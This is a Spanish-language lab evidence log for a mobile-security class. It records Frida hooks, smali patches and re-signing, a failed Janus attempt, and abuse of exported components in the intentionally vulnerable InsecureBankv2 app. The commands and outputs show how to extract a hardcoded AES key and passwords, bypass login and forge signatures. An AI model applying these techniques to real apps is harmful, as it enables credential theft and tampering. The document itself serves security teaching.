# Clase 3 — Evidencia de verificación

Transcripción literal de lo ejecutado para preparar la Clase 3, al estilo de
[`clase-2-evidencia.md`](clase-2-evidencia.md). No hay salidas redactadas ni
resultados esperadas: si algo falló, está aquí con el fallo.

| | |
|---|---|
| **Fecha** | 4 de octubre de 2026 |
| **Método** | Ejecución real contra la VM y el servidor, no lectura del guion |
| **VM** | `172.25.208.100:5555` — Standard PC (i440FX + PIIX, 1996), Android 8.1.0 (API 27), x86_64, sesión ADB `uid=0(root)` |
| **Host** | `172.25.208.104` — backend `insecurebankv2-server` en `:8888` |
| **App** | InsecureBankv2 `com.android.insecurebankv2`, firma `CN=Dinesh Shetty`, **solo v1** |
| **Frida** | cliente y `frida-server` 17.19.0 |

---

## 1. Punto de partida: el guion antiguo tenía 5 errores

Antes de verificar nada, el guion de `class3_runbook()` promising cosas que no se
cumplían. Estos son los cinco fallos, todos confirmados:

| # | Afirmación del guion | Realidad verificada |
|---|---|---|
| 1 | `frida -U -f ... --no-pause` | `--no-pause` **no existe en Frida 16+**. `unrecognized arguments` |
| 2 | Hook sobre `CryptoClass.encrypt` / `.decrypt` | **Esos métodos no existen.** Reales: `aes256encrypt`, `aes256decrypt`, `aesEncryptedString`, `aesDeccryptedString` |
| 3 | Hook que llama `this.encrypt(...)` dentro de su propio replacement | **Recursión infinita.** Además el overload no existe, así que ni compila |
| 4 | Modifica `res/drawable-hdpi/ic_launcher.png` | La app no usa `drawable-hdpi`; usa `mipmap`. El fichero indicado tampoco existe |
| 5 | `tcpdump -i any -w f.pcap host 172.25.208.100` | Sintaxis incorrecta: `-w` no acepta filtro de host así. Y **`tshark` no está instalado** |

Además, dos problemas de laboratorio:

| # | Problema | Realidad verificada |
|---|---|---|
| 6 | La clase exige `apktool` | **No está instalado.** El script solo lo instala con `--extras`. `apt-cache policy apktool` → candidato `2.7.0+dfsg-7`, así que sí es instalable |
| 7 | La clase exige `tshark` | **Ausente.** `verify()` no lo comprueba. Se eliminó de la clase: no aporta nada a M8/M9/M10 |
| 8 | `apksigner` y `aapt` | Están en `/opt/android-sdk/build-tools/33.0.2/` pero **fuera del PATH** |
| 9 | Instalar la APK modificada y luego `clase1-prep` | Contradicción: `clase1-prep` reinstala la APK original encima y deshace la modificación |

---

## 2. M9 — Reverse Engineering

### 2.1 La clase `CryptoClass` real

```bash
sed -n '15,30p' sources/com/android/insecurebankv2/CryptoClass.java
```

```java
public class CryptoClass {
    String base64Text;
    byte[] cipherData;
    String cipherText;
    String plainText;
    String key = "This is the super secret key 123";
    byte[] ivBytes = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};

    public static byte[] aes256encrypt(byte[] ivBytes, byte[] keyBytes, byte[] textBytes)
            throws BadPaddingException, NoSuchPaddingException, ... {
        AlgorithmParameterSpec ivSpec = new IvParameterSpec(ivBytes);
        SecretKeySpec newKey = new SecretKeySpec(keyBytes, "AES");
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
```

Referencias exactas:

| Qué | Dónde |
|---|---|
| Clave `"This is the super secret key 123"` | `CryptoClass.java:22` |
| IV de 16 ceros | `CryptoClass.java:23` |
| `AES/CBC/PKCS5Padding` | `CryptoClass.java:28` |
| `aesDeccryptedString` (**doble `c`**) | `CryptoClass.java:41` |
| `aesEncryptedString` | `CryptoClass.java:48` |

Confirmación de que `encrypt`/`decrypt` no existen:

```bash
grep -nE '\b(encrypt|decrypt)\s*\(' sources/.../CryptoClass.java
# NINGUNO — el hook del guion no tiene destino
```

### 2.2 Manifest: seis componentes `exported="true"`

```
activity   com.android.insecurebankv2.LoginActivity                exported=None
activity   com.android.insecurebankv2.FilePrefActivity             exported=None
activity   com.android.insecurebankv2.DoLogin                      exported=None
activity   com.android.insecurebankv2.PostLogin                    exported=true
activity   com.android.insecurebankv2.DoTransfer                   exported=true
activity   com.android.insecurebankv2.ViewStatement                exported=true
provider   com.android.insecurebankv2.TrackUserContentProvider     exported=true
receiver   com.android.insecurebankv2.MyBroadCastReceiver          exported=true
activity   com.android.insecurebankv2.WrongLogin                   exported=None
activity   com.android.insecurebankv2.ChangePassword               exported=true
activity   com.google.android.gms.ads.AdActivity                   exported=None
activity   com.google.android.gms.ads.purchase.InAppPurchaseActivity exported=None
receiver   com.google.android.gms.wallet.EnableWalletOptimizationReceiver exported=false
```

Banderas:

```bash
grep -oE 'android:(debuggable|allowBackup|usesCleartextTraffic)="[^"]*"' \
  resources/AndroidManifest.xml | sort -u
```

```
android:allowBackup="true"
android:debuggable="true"
```

No hay `usesCleartextTraffic`, pero el riesgo equivalente está en el código:
`DoLogin.java:51` usa `protocol="http://"`.

### 2.3 Hook de Frida: verificado en las dos direcciones

Hook: [`hook-m9-clave.js`](hook-m9-clave.js), sobre los nombres reales de método.

**Adjuntar por PID, no con `-f`:**

```bash
PID=$(adb -s 172.25.208.100:5555 shell pidof com.android.insecurebankv2 | tr -d '\r')
frida -U -p "$PID" -l hook-m9-clave.js
```

> **Por qué importa (bug encontrado al probar, no al leer):** con `frida -f`
> (spawn) el hook **nunca disparó**. La causa es una carrera: el script se
> instala cuando el runtime está listo, pero `LoginActivity.onCreate` ya había
> ejecutado y descifrado la credencial guardada (`LoginActivity.java:87`) en ese
> `aesDeccryptedString` inicial. Con `-f` te pierdes justo ese evento. También
> se observó que `frida -U -n <paquete>` falló con
> `Failed to spawn: unable to find process with name 'com.android.insecurebankv2'`
> aunque el proceso existía (`ps` lo mostraba como PID 6451): sincronización de
> la lista de procesos. Adjuntar por PID no falló nunca.

**Instalación correcta** (si el método no existiera, `.overload()` lanzaría
excepción; el banner se imprimió, luego el hook existe):

```
=========================================================
 M9 — Interceptando el cifrado de com.android.insecurebankv2.CryptoClass
=========================================================

 Hooks activos. Haz login (o dispara el receptor de SMS) y mira
 lo que aparece arriba.
=========================================================
```

**Login válido → cifrado capturado:**

```bash
adb shell input tap 320 102; adb shell input text "dinesh"
adb shell input tap 320 171; adb shell input text "Dinesh@123\$"
adb shell input keyevent 111
adb shell input tap 320 234
```

```
  [M9] aesEncryptedString  (cifrando)  <-  "Dinesh@123$"
        clave en memoria : "This is the super secret key 123"
        IV en memoria    : 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
```

**Broadcast al receptor exportado → descifrado capturado:**

```bash
adb shell am broadcast -n com.android.insecurebankv2/.MyBroadCastReceiver \
  --es phonenumber "+34600000000" --es newpass "PRUEBA-M9"
# Broadcasting: Intent { flg=0x400000 cmp=com.android.insecurebankv2/.MyBroadCastReceiver (has extras) }
# Broadcast completed: result=0
```

```
  [M9] aesDeccryptedString (descifrando)  <-  "DTrW2VXjSoFdg0e61fHxJg=="
        clave en memoria : "This is the super secret key 123"
```

Y el resultado del descifrado en el log del sistema (M6):

```
System.out: For the changepassword - phonenumber: +34600000000 password is: Updated Password from: Dinesh@123$ to: PRUEBA-M9
```

Corroboración cruzada — el Base64 del hook es el mismo que está en disco:

```bash
adb shell "cat /data/data/com.android.insecurebankv2/shared_prefs/mySharedPreferences.xml"
```

```xml
<string name="superSecurePassword">DTrW2VXjSoFdg0e61fHxJg==&#10;    </string>
<string name="EncryptedUsername">ZGluZXNo&#13;&#10;    </string>
```

### 2.4 Condición de guardado de credenciales

```bash
grep -n 'saveCreds' sources/com/android/insecurebankv2/DoLogin.java
```

```
116:                saveCreds(DoLogin.this.username, DoLogin.this.password);
139:        private void saveCreds(String username, String password) throws ...
```

Se llama en **todo** login correcto, sin checkbox. Y está **dentro** de
`postData`, que es el dato que explica §4.2.

---

## 3. M8 — Code Tampering

### 3.1 Desensamblado y localización de las puertas

```bash
apktool d ~/mobile-owasp-lab/apps/apk/InsecureBankv2.apk -o InsecureBankv2_mod -f
```

```
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files/dir...
I: Copying original files...
```

```bash
grep -nE 'Correct Credentials|indexOf' \
  InsecureBankv2_mod/smali/com/android/insecurebankv2/DoLogin\$RequestTask.smali
```

```
613:    const-string v9, "Correct Credentials"
615:    invoke-virtual {v8, v9}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I
```

Contexto real (líneas 605-630):

```smali
    if-eqz v8, :cond_0

    .line 141
    iget-object v8, p0, Lcom/android/insecurebankv2/DoLogin$RequestTask;->this$0:Lcom/android/insecurebankv2/DoLogin;

    iget-object v8, v8, Lcom/android/insecurebankv2/DoLogin;->result:Ljava/lang/String;

    const-string v9, "Correct Credentials"

    invoke-virtual {v8, v9}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v8

    const/4 v9, -0x1

    if-eq v8, v9, :cond_2

    .line 142
    const-string v8, "Successful Login:"
```

**Dos puertas:** `if-eqz v8, :cond_0` (respuesta nula) e `if-eq v8, v9, :cond_2`
(respuesta sin la frase buena).

### 3.2 Parche, reconstrucción y firma

```bash
python3 - "$F" <<'PY'   # dos sustituciones, ver clase-3-*.md §2.3
PY
# las dos puertas parcheadas

apktool b InsecureBankv2_mod -o InsecureBankv2_mod2.apk
```

```
I: Building resources...
W: aapt: brut.common.BrutException: brut.common.BrutException: Could not extract
   resource: /prebuilt/linux/aapt_64 (defaulting to $PATH binary)
I: Building apk file...
I: Copying unknown files/dir...
I: Built apk into: InsecureBankv2_mod2.apk
```

> El `W:` sobre `/prebuilt/linux/aapt_64` es normal: el paquete de Ubuntu está
> compilado para otra arquitectura y apktool cae a su `aapt` embebido. **La
> construcción funcionó**; no lo confundas con un fallo.

```bash
keytool -genkeypair -v -keystore attacker.keystore -alias attacker \
  -keyalg RSA -keysize 2048 -validity 10000 \
  -storepass attacker123 -keypass attacker123 \
  -dname "CN=Attacker, OU=Fake, O=EvilCorp, L=Nowhere, C=XX"
```

```
	for: CN=Attacker, OU=Fake, O=EvilCorp, L=Nowhere, C=XX
[Storing attacker.keystore]
```

```bash
apksigner sign --ks attacker.keystore --ks-key-alias attacker \
  --ks-pass pass:attacker123 --key-pass pass:attacker123 \
  --out InsecureBankv2_mod2_signed.apk InsecureBankv2_mod2.apk
```

### 3.3 Comparación de firmas — el resultado central

```bash
apksigner verify --verbose --print-certs ~/mobile-owasp-lab/apps/apk/InsecureBankv2.apk
```

```
Verified using v1 scheme (JAR signing): true
Verified using v2 scheme (APK Signature Scheme v2): false
Verified using v3 scheme (APK Signature Scheme v3): false
Verified using v3.1 scheme (APK Signature Scheme v3.1): false
Verified using v4 scheme (APK Signature Scheme v4): false
Signer #1 certificate DN: CN=Dinesh Shetty, OU=Services, O=SI, L=Boston, ST=MA
```

```bash
apksigner verify --verbose --print-certs InsecureBankv2_mod2_signed.apk
```

```
Verified using v1 scheme (JAR signing): true
Verified using v2 scheme (APK Signature Scheme v2): true
Verified using v3 scheme (APK Signature Scheme v3): true
Verified using v3.1 scheme (APK Signature Scheme v3.1): false
Verified using v4 scheme (APK Signature Scheme v4): false
Signer #1 certificate DN: CN=Attacker, OU=Fake, O=EvilCorp, L=Nowhere, C=XX
```

| | Original | Modificada |
|---|---|---|
| Firmante | `CN=Dinesh Shetty, OU=Services, O=SI` | `CN=Attacker, O=EvilCorp, C=XX` |
| v1 (JAR) | ✅ | ✅ |
| v2 (APK Sig Scheme v2) | ❌ | ✅ |
| v3 | ❌ | ✅ |

`apksigner` añadió v2 y v3 automáticamente al re-firmar, leyendo el
`minSdkVersion` del manifiesto. **El acto de falsificar la app reparó el defecto
de firma que tenía.**

### 3.4 Demostración verificada

```bash
adb -s 172.25.208.100:5555 uninstall com.android.insecurebankv2
# Success
adb -s 172.25.208.100:5555 install InsecureBankv2_mod2_signed.apk
# Performing Streamed Install
# Success
```

Control — qué dice el servidor:

```bash
curl -s -X POST -d 'username=usuario-inexistente&password=basura' \
  http://127.0.0.1:8888/login
```

```json
{"message": "User Does not Exist", "user": "usuario-inexistente"}
```

Login en la app parcheada con esas credenciales:

```
insecurebankv2/com
text="PostLogin"
text="Transfer"
text="View Statement"
text="Change Password"
text="Rooted Device!!"
```

Y el registro del sistema (M6):

```
10-04 05:47:18.281  5129  5148 D Successful Login:: , account=usuario-inexistente:basura
```

**El servidor rechazó el login; la app parcheada lo aceptó y lo registró como
correcto.**

### 3.5 M8 de identidad

```
text="BancoSeguro OFICIAL"
text="dinesh"
text="••••••••"
text="Login"
```

Dentro del binario, no es una etiqueta:

```bash
unzip -p InsecureBankv2_mod2_signed.apk resources.arsc | strings | grep -i BancoSeguro
# BancoSeguro OFICIAL
```

---

## 4. Los dos ❌ — lo que NO funcionó

Esta sección es la razón de ser de este documento. Un ataque que se cuenta sin
su parte fallida enseña lo contrario de lo que debe.

### 4.1 ❌ Un solo parche no basta: hay dos puertas

Parcheando **solo** la puerta 2 (`if-eq v8, v9, :cond_2`), con el backend
**encendido** la app entraba. Con el backend **apagado** no:

```
backend: inactive  <- APAGADO a propósito
insecurebankv2/com
text="PostLogin"        <-- con backend ON
```

```
backend: inactive
insecurebankv2/com
text="Login"            <-- con backend OFF, NO entró
```

Causa: la puerta 1 (`if-eqz v8, :cond_0`) rechazaba el `result` nulo.

### 4.2 ❌ Con las dos puertas parcheadas tampoco, si el servidor está caído

```bash
sudo systemctl stop insecurebankv2-server
curl -s -m 3 -X POST -d 'username=dinesh&password=Dinesh@123$' \
  http://127.0.0.1:8888/login
# backend INALCANZABLE (confirmado)
```

```
backend: inactive  <- APAGADO, y lo queda
insecurebankv2/com
text="PostLogin"    <-- NUNCA apareció; se quedó en login
```

**Causa raíz** (relevendo el Java, no el smali):

```java
public void postData(String valueIWantToSend) throws ..., IOException, ... {
    ...
    responseBody = httpclient.execute(httppost);     // ← la excepción salta AQUÍ
    InputStream in = responseBody.getEntity().getContent();
    DoLogin.this.result = convertStreamToString(in);
    if (DoLogin.this.result != null) {               // ← y nos vamos por aquí
        if (DoLogin.this.result.indexOf("Correct Credentials") != -1) {
            saveCreds(...);
```

El chequeo está **dentro del `try`** que hace la llamada de red. Si el servidor
no responde, la `IOException` aborta antes de ejecutar los `nop`. Los parches
nunca corren.

**Consecuencia docente:** M8 no es «cambiar un `if`». Es cubrir **todos** los
caminos de decisión. Un atacante real sustituye el cuerpo del método entero, o
engancha el resultado (como en la Clase 2 con `hook-m3-bypass.js`).

### 4.3 ❌ Janus: la firma se rompe… no. El parser sí

Constructo el DEX malicioso:

```bash
javac -d classes janus-src/CryptoClass.java
/opt/android-sdk/build-tools/33.0.2/d8 --min-api 15 --output . \
  classes/com/android/insecurebankv2/CryptoClass.class
```

```
Warning in classes/com/android/insecurebankv2/CryptoClass.class:
One or more classes has class file version >= 56 which is not officially supported.
-rw-rw-r-- 1 cwl cwl 844 Oct  4 16:46 classes.dex
file classes.dex -> Dalvik dex file version 035
```

> El aviso de «class file version >= 56» es `javac 17` generando bytecode que
> `d8` no reconoce oficialmente. **El DEX resultante es válido** (`dex version
> 035`) y funciona. No es un error.

Prepend con corrección del directorio central:

```
DEX prependido: 844 bytes; dir. central en 3408268 -> 3409112
entradas del dir. central reubicadas: 555
escrito InsecureBankv2_janus.apk: 3463273 bytes
entrada a entrada identicas: OK (555 entradas)
```

**El ZIP es íntegro:**

```bash
unzip -t InsecureBankv2_janus.apk
```

```
No errors detected in compressed data of InsecureBankv2_janus.apk.
```

**La firma v1 original sigue siendo válida** ✅

```bash
apksigner verify --verbose InsecureBankv2_janus.apk
```

```
Verified using v1 scheme (JAR signing): true
Verified using v2 scheme (APK Signature Scheme v2): false
Verified using v3 scheme (APK Signature Scheme v3): false
```

**Y el contenido es byte-idéntico al original** ✅

```
AndroidManifest.xml: IDÉNTICO
  1c837665af41be7d51cfa8475106e69f14aee6342f4df81f39273b8ae64fcaf9  (janus)
  1c837665af41be7d51cfa8475106e69f14aee6342f4df81f39273b8ae64fcaf9  (original)
  0eb27df9847d5709df0cd2677baaf66ee3226e45b132149dc3039456dde79533  classes.dex (janus)
  0eb27df9847d5709df0cd2677baaf66ee3226e45b132149dc3039456dde79533  classes.dex (original)
```

**Pero Android 8.1 no la instala** ❌

```bash
adb install InsecureBankv2_janus.apk
```

```
adb: failed to install InsecureBankv2_janus.apk: Failure
  [INSTALL_PARSE_FAILED_UNEXPECTED_EXCEPTION: Failed to parse
   /data/app/vmdl41843812.tmp/base.apk: AndroidManifest.xml]
```

Motivo exacto:

```bash
adb logcat -d | grep -i PackageParser
```

```
10-04 05:49:50.660  1424  2535 W PackageParser: Failed to parse /data/app/vmdl818355016.tmp/base.apk
10-04 05:49:50.660  1424  2535 W PackageParser: java.io.FileNotFoundException: AndroidManifest.xml
10-04 05:50:14.248  1424  2535 W PackageParser: 	at android.content.res.AssetManager.openXmlAssetNative(Native Method)
```

Variante sin corregir el directorio central: **mismo** `FileNotFoundException`.
Control: la APK original instala bien.

**El límite de versiones encaja con la documentación.** NVD lista CVE-2017-13156
como afecta a Android **5.1.1, 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2, 8.0**. La VM es
**8.1.0**, fuera del rango, y es exactamente donde falla el parser. Comprobación
independiente de un límite documentado.

**Conclusión, redactada con precisión:**

| Afirmación | Estado |
|---|---|
| La firma v1 no cubre los bytes anteriores a la primera entrada del ZIP | ✅ Demostrado (`apksigner verify` pasa con 844 bytes ajenos) |
| La APK sigue siendo un ZIP íntegro con contenido byte-idéntico | ✅ Demostrado (`unzip -t`, sha256) |
| El exploit Janus completa la instalación en Android 8.1 | ❌ **No.** `PackageParser` bloquea con `FileNotFoundException` |
| Firmar con v2/v3 lo evita | ✅ El esquema v2 «tiene en cuenta todos los bytes del fichero APK», según la documentación de AOSP |

---

## 5. M10 — Funcionalidad extraña

### 5.1 `/devlogin`: bypass completo de autenticación

```bash
curl -s -X POST -d 'username=devadmin&password=cualquier-cosa' \
  http://127.0.0.1:8888/devlogin
```

```json
{"message": "Correct Credentials", "user": "devadmin"}
```

Código (`DoLogin.java:103`):

```java
if (DoLogin.this.username.equals("devadmin")) {
```

### 5.2 `PostLogin` exportada: dentro sin autenticarse

```bash
adb shell am force-stop com.android.insecurebankv2
adb shell input keyevent 3
# mCurrentFocus=Window{...com.android.launcher3/com.android.launcher3.Launcher}

adb shell am start -n com.android.insecurebankv2/.PostLogin
# Starting: Intent { cmp=com.android.insecurebankv2/.PostLogin }
```

Tras 4 segundos:

```
insecurebankv2/com
text="PostLogin"
text="Transfer"
text="View Statement"
text="Change Password"
text="Rooted Device!!"
```

Sin usuario, sin contraseña, desde el launcher.

### 5.3 El hallazgo mayor: receptor exportado que exfiltra la contraseña por SMS

Código (`MyBroadCastReceiver.java:24-33`):

```java
SharedPreferences settings = context.getSharedPreferences("mySharedPreferences", 1);
String password = settings.getString("superSecurePassword", null);
CryptoClass crypt = new CryptoClass();
String decryptedPassword = crypt.aesDeccryptedString(password);
String textPhoneno = phn.toString();
String textMessage = "Updated Password from: " + decryptedPassword + " to: " + newpass;
SmsManager smsManager = SmsManager.getDefault();
System.out.println("For the changepassword - phonenumber: " + textPhoneno + " password is: " + textMessage);
smsManager.sendTextMessage(textPhoneno, null, textMessage, null, null);
```

Permisos exigidos por el receiver: **ninguno** (`exported=true` y sin
`android:permission`).

Ejecución desde fuera de la app:

```bash
adb logcat -c
adb shell am force-stop com.android.insecurebankv2
adb shell am broadcast -n com.android.insecurebankv2/.MyBroadCastReceiver \
  --es phonenumber "+34600000000" --es newpass "ATACANTE-DICE-ESTO"
```

```
Broadcasting: Intent { flg=0x400000 cmp=com.android.insecurebankv2/.MyBroadCastReceiver (has extras) }
Broadcast completed: result=0
```

```bash
adb logcat -d | grep -i 'For the changepassword'
```

```
10-04 05:40:21.283  3796  3796 I System.out: For the changepassword - phonenumber: +34600000000 password is: Updated Password from: Dinesh@123$ to: ATACANTE-DICE-ESTO
```

**Contraseña en claro, descifrada con la clave de M4 y dirigida al número
indicado, desde fuera de la app.**

> **Matiz honesto:** en `logcat` no aparece ninguna excepción de `SmsManager`, lo
> que indica que el flujo llegó a `sendTextMessage` sin error. La VM no tiene SIM,
> así que no se puede confirmar la entrega física. Lo **probado** es la
> descifrase y la entrega de la credencial al canal de salida.

### 5.4 ContentProvider: sin permisos, lectura **y** escritura

```bash
python3 - <<'PY'   # atributos del <provider>
PY
```

```
  provider: com.android.insecurebankv2.TrackUserContentProvider
    exported: true
    readPermission: None
    writePermission: None
    permission: None
    -> permisos exigidos: NINGUNO
```

Authority y ruta reales:

```
android:authorities="com.android.insecurebankv2.TrackUserContentProvider"
URL = content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
```

> La primera URL que se prueba (`...provider.trackuser`) falla con
> `Could not find provider`. La correcta es el **authority del manifest**, que
> incluye el nombre de la clase, no `provider`. Es un error fácil de cometer.

Lectura:

```bash
adb shell content query --uri content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
```

```
Row: 0 id=11, name=devadmin
Row: 1 id=15, name=devadmin
Row: 2 id=12, name=dinesh
Row: 3 id=13, name=dinesh
Row: 4 id=14, name=dinesh
Row: 5 id=16, name=dinesh
```

Escritura (inyección de fila):

```bash
adb shell content insert --uri "$U" --bind name:s:injectado
adb shell content query --uri "$U" | tail -1
```

```
Row: 11 id=22, name=injectado
```

Borrado — **con el quoting correcto**:

```bash
adb shell "content delete --uri \"$U\" --where \"name='injectado'\""
```

> Sin las comillas internas el shell las elimina y queda:
> `SQLiteException: no such column: injectado (code 1): , while compiling: DELETE FROM names WHERE name=injectado`
> Es decir, `content delete` interpretó `injectado` como nombre de columna.
> Coste de este bug: dos intentos.

### 5.5 SDKs de terceros

```
com.google.android.gms.ads.AdActivity
com.google.android.gms.ads.purchase.InAppPurchaseActivity
com.google.android.gms.wallet.ENABLE_WALLET_OPTIMIZATION
com.google.android.gms.wallet.EnableWalletOptimizationReceiver
com.google.android.gms.wallet.api.enabled
```

### 5.6 Detección de root decorativa

```bash
grep -rn 'Rooted Device' sources/
```

```
sources/com/android/insecurebankv2/PostLogin.java:58:            this.root_status.setText("Rooted Device!!");
```

Solo escribe texto. No bloquea ni limita nada.

---

## 6. Resumen de hallazgos de la Clase 3

| # | Riesgo | Hallazgo | Verificado | Instrumentación |
|---|---|---|---|---|
| 1 | M9/M4 | Clave AES embebida `This is the super secret key 123` | ✅ JADX | Ninguna |
| 2 | M4 | IV de 16 ceros, fijo | ✅ JADX + Frida | Ninguna |
| 3 | M4 | `AES/CBC/PKCS5Padding` sin autenticar | ✅ JADX | Ninguna |
| 4 | M9 | Contraseña en claro en memoria al cifrar | ✅ **Frida** | `hook-m9-clave.js` |
| 5 | M9 | `debuggable="true"` | ✅ Manifest | Ninguna |
| 6 | M2 | `allowBackup="true"` | ✅ Manifest | Ninguna |
| 7 | M5 | `protocol="http://"` (`DoLogin.java:51`) | ✅ Código | Ninguna |
| 8 | M3/M10 | `/devlogin` con `devadmin` sin contraseña | ✅ curl | Ninguna |
| 9 | M1/M7 | 4 actividades exportadas | ✅ Manifest | Ninguna |
| 10 | M1/M7/M3 | `PostLogin` exportada: acceso sin login | ✅ `am start` | Ninguna |
| 11 | M4/M7/M10/M6 | Receptor exportado exfiltra la contraseña por SMS | ✅ `am broadcast` + logcat | Ninguna |
| 12 | M2/M7 | Provider exportado sin permisos: lectura y escritura | ✅ `content query/insert` | Ninguna |
| 13 | M8 | Parche de smali elimina la validación de login | ✅ instalado y ejecutado | `apktool` |
| 14 | M8 | APK re-firmada por `CN=Attacker` con v2+v3 | ✅ `apksigner verify` | `apksigner` |
| 15 | M8 | Renombrado a `BancoSeguro OFICIAL` | ✅ `resources.arsc` | `apktool` |
| 16 | M8 | Validación dentro del `try`: no bypaseable sin red | ✅ ❌ fallo documentado | `apktool` |
| 17 | M8 | Solo-v1 no cubre bytes prependidos | ✅ `apksigner verify` | `prepend.py` |
| 18 | M8 | Android 8.1 bloquea el resultado (Janus) | ✅ ❌ fallo documentado | `prepend.py` |
| 19 | M10 | Google Wallet y AdMob en una app bancaria | ✅ Manifest | Ninguna |
| 20 | M10 | Detección de root solo decorativa | ✅ Código | Ninguna |

**11 de 20 se demostraron sin instrumentación alguna.** Solo 3 requieren Frida, y 3
requirieron reconstruir la APK.

---

## 7. Estado del laboratorio tras la verificación

Restaurado a condiciones limpias:

```
app instalada:     1  (original)
firma:             CN=Dinesh Shetty
backend:           active
proxy VM:          :0
usuarios back:     dinesh,jack
nombres en mydb:   0   (tabla vaciada)
```

### Notas de operación para la clase

| Nota | Detalle |
|---|---|
| `pkill -f <patrón>` | **Mata tu propia shell** si el patrón aparece en la línea de comandos. Usa el PID: `ps -eo pid,args \| grep -F '<patrón>' \| awk '{print $1}'` |
| `adb push` de `shared_prefs.xml` | El fichero queda como `root` y la app (uid `u0_a75`) no lo puede leer: vuelve a `FilePref` con `10.0.2.2`. Configúralo a mano en la pantalla |
| `input text` con caracteres especiales | No los maneja bien (`$`, `@` a veces). Si falla, borra el campo con `keyevent 67` repetido y reescribe |
| Teclado abierto | `input keyevent 111` (ESC) lo cierra; si no, los taps caen en el sitio equivocado |
| `frida -f` vs `-p` | `-f` pierde el descifrado del `onCreate`. Usa `-p` sobre la app ya arrancada |
| `apktool b` y el aviso `/prebuilt/linux/aapt_64` | Normal en el paquete de Ubuntu. La construcción funciona |
| `d8` con clases de `javac 17` | Aviso de «class file version >= 56». El DEX es válido (`dex version 035`) |